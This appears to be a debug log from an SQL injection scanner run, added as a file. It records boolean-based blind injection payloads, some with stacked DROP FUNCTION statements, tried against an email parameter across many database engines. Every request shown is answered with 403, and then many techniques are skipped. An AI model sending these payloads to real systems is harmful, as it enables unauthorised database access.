+[08:22:55] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[08:22:55] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (1270=9427) THEN 1 ELSE 1270*(SELECT 1270 UNION ALL SELECT 9427) END))-- -
+[08:22:56] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:56] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (1906=1906) THEN 1 ELSE 1906*(SELECT 1906 UNION ALL SELECT 4359) END))-- -
+[08:22:57] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
+[08:22:57] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (6762=3395) THEN CHAR(64)+CHAR(69)+CHAR(77)+CHAR(65)+CHAR(73)+CHAR(76)+CHAR(64) ELSE 6762*(SELECT 6762 UNION ALL SELECT 3395) END))-- -
+[08:22:59] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:59] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (6200=6200) THEN CHAR(64)+CHAR(69)+CHAR(77)+CHAR(65)+CHAR(73)+CHAR(76)+CHAR(64) ELSE 6200*(SELECT 6200 UNION ALL SELECT 8011) END))-- -
+[08:23:00] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:00] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[08:23:00] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (3487=4908) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:23:01] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:01] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (6342=6342) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:23:02] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:02] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:23:02] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (5467=4445) THEN CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:23:03] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:03] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (2191=2191) THEN CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:23:04] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:04] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
+[08:23:04] [PAYLOAD] @EMAIL@' ,IIF(6547=1416,1,1/0)-- -
+[08:23:05] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:05] [PAYLOAD] @EMAIL@' ,IIF(1918=1918,1,1/0)-- -
+[08:23:06] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:06] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:23:06] [PAYLOAD] @EMAIL@' ,IIF(7380=9968,CHR(64)&CHR(69)&CHR(77)&CHR(65)&CHR(73)&CHR(76)&CHR(64),1/0)-- -
+[08:23:07] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:07] [PAYLOAD] @EMAIL@' ,IIF(7675=7675,CHR(64)&CHR(69)&CHR(77)&CHR(65)&CHR(73)&CHR(76)&CHR(64),1/0)-- -
+[08:23:08] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:08] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
+[08:23:08] [PAYLOAD] @EMAIL@' ,(CASE WHEN 7110=1921 THEN 1 ELSE NULL END)-- -
+[08:23:09] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:09] [PAYLOAD] @EMAIL@' ,(CASE WHEN 5784=5784 THEN 1 ELSE NULL END)-- -
+[08:23:11] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:23:11] [PAYLOAD] @EMAIL@' ,(CASE WHEN 6331=8765 THEN '@EMAIL@' ELSE NULL END)-- -
+[08:23:12] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:12] [PAYLOAD] @EMAIL@' ,(CASE WHEN 1304=1304 THEN '@EMAIL@' ELSE NULL END)-- -
+[08:23:13] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:13] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
+[08:23:13] [PAYLOAD] @EMAIL@' ,(SELECT CASE WHEN 2612=2870 THEN 1 ELSE RAISE_ERROR(70001, CHR(80)||CHR(111)||CHR(88)||CHR(76)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:23:14] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:14] [PAYLOAD] @EMAIL@' ,(SELECT CASE WHEN 9643=9643 THEN 1 ELSE RAISE_ERROR(70001, CHR(80)||CHR(87)||CHR(71)||CHR(83)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:23:15] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:15] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
+[08:23:15] [PAYLOAD] @EMAIL@' ,(SELECT CASE WHEN 4890=5044 THEN CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64) ELSE RAISE_ERROR(70001, CHR(114)||CHR(105)||CHR(73)||CHR(76)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:23:16] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:16] [PAYLOAD] @EMAIL@' ,(SELECT CASE WHEN 2648=2648 THEN CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64) ELSE RAISE_ERROR(70001, CHR(74)||CHR(102)||CHR(67)||CHR(117)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:23:17] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:17] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[08:23:17] [PAYLOAD] @EMAIL@'  HAVING 9913=4576-- -
+[08:23:18] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:18] [PAYLOAD] @EMAIL@'  HAVING 8333=8333-- -
+[08:23:19] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[08:23:19] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (3519=5795) THEN 3519 ELSE 3519*(SELECT 3519 FROM INFORMATION_SCHEMA.PLUGINS) END)-- -
+[08:23:20] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:20] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (9029=9029) THEN 9029 ELSE 9029*(SELECT 9029 FROM INFORMATION_SCHEMA.PLUGINS) END)-- -
+[08:23:21] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:21] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[08:23:21] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (4416=4673) THEN 4416 ELSE 1/(SELECT 0) END)-- -
+[08:23:22] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:22] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (5657=5657) THEN 5657 ELSE 1/(SELECT 0) END)-- -
+[08:23:24] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:24] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[08:23:24] [PAYLOAD] @EMAIL@' ;SELECT * FROM GENERATE_SERIES(9100,9100,CASE WHEN (9100=5048) THEN 1 ELSE 0 END) LIMIT 1-- -
+[08:23:25] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:25] [PAYLOAD] @EMAIL@' ;SELECT * FROM GENERATE_SERIES(3365,3365,CASE WHEN (3365=3365) THEN 1 ELSE 0 END) LIMIT 1-- -
+[08:23:26] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[08:23:26] [PAYLOAD] @EMAIL@' ;IF(7035=9137) SELECT 7035 ELSE DROP FUNCTION bpxo-- -
+[08:23:27] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:27] [PAYLOAD] @EMAIL@' ;IF(4389=4389) SELECT 4389 ELSE DROP FUNCTION SIlg-- -
+[08:23:28] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
+[08:23:28] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (6297=5073) THEN 1 ELSE 6297*(SELECT 6297 UNION ALL SELECT 5073) END)-- -
+[08:23:29] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:29] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (2171=2171) THEN 1 ELSE 2171*(SELECT 2171 UNION ALL SELECT 9402) END)-- -
+[08:23:30] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:30] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
+[08:23:30] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (3751=7877) THEN 3751 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL-- -
+[08:23:31] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:31] [PAYLOAD] @EMAIL@' ;SELECT (CASE WHEN (6254=6254) THEN 6254 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL-- -
+[08:23:32] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:32] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
+[08:23:32] [PAYLOAD] @EMAIL@' ;IIF(1935=4647,1,1/0)-- -
+[08:23:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:33] [PAYLOAD] @EMAIL@' ;IIF(6521=6521,1,1/0)-- -
+[08:23:34] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:34] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[08:23:34] [PAYLOAD] @EMAIL@' ;SELECT CASE WHEN 4873=3937 THEN 1 ELSE NULL END FROM DUAL-- -
+[08:23:35] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:35] [PAYLOAD] @EMAIL@' ;SELECT CASE WHEN 2374=2374 THEN 1 ELSE NULL END FROM DUAL-- -
+[08:23:36] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - Table name clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'InterSystems Cache AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'InterSystems Cache OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'CUBRID AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'CUBRID OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Virtuoso AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Virtuoso OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (getSetting)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'H2 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Spanner AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Spanner OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite >= 3.9 OR error-based - WHERE or HAVING clause (JSON path)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Presto AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PARSE_DATA_SIZE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Presto OR error-based - WHERE or HAVING clause (PARSE_DATA_SIZE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server error-based - Stacking (RAISERROR)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse inline queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (no semicolon)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - no semicolon)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
